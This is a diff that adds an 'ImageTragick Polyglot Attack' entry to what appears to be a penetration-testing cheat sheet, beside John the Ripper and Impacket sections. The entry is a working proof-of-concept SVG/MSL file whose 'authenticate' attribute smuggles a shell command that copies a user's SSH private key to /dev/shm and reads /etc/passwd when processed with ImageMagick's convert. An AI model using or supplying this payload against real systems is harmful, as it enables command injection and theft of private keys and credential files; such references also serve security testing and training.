@@ -877,6 +877,21 @@ john --show <file>
 ```
 
 ### Exploitation Tools
+#### ImageTragick Polyglot Attack
+```c
+poc.svg
+<image authenticate='ff" `echo $(cat /home/<user>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="msl:poc.svg" height="100" width="100"/>
+  </svg>
+</image>
+
+$ convert poc.svg poc.png
+```
 #### Impacket
 ##### Basic Commands
 ```c
